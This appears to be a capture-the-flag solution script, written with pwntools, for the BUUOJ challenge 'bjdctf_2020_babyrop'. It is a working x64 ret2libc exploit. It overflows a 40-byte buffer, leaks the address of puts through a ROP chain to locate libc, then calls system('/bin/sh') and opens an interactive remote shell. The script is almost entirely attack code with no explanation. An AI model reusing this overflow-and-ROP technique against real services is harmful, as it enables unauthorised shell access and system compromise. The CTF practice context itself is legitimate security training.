#Made by fly_autumn
#x64 ret2libc
from pwn import *
#p = process("./bjdctf_2020_babyrop")
p = remote("node5.buuoj.cn",28006)
elf = ELF("./bjdctf_2020_babyrop")
context(os="linux",arch="amd64")
libc = ELF("./libc.so.6")

offset = 40
pop_rdi = 0x400733
puts_got = elf.got["puts"]
puts_plt = elf.plt["puts"]
vuln_plt = 0x40067d
ret = 0x4004c9

payload = b"\x00" * offset + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(vuln_plt)
p.recvuntil(b"story!\n")
p.sendline(payload)

puts_addr = u64(p.recv(6).ljust(8,b"\0"))
log.success("puts addr: "+hex(puts_addr))
libc_addr = puts_addr - libc.sym["puts"]
log.success("libc addr: "+hex(libc_addr))
sys_addr = libc_addr + libc.sym["system"]
log.success("sys addr: "+hex(sys_addr))
sh_addr = libc_addr + next(libc.search("/bin/sh"))
log.success("sh addr: "+hex(sh_addr))

payload = b"\x00" * offset + p64(pop_rdi) + p64(sh_addr) + p64(sys_addr)
p.sendline(payload)

p.interactive()
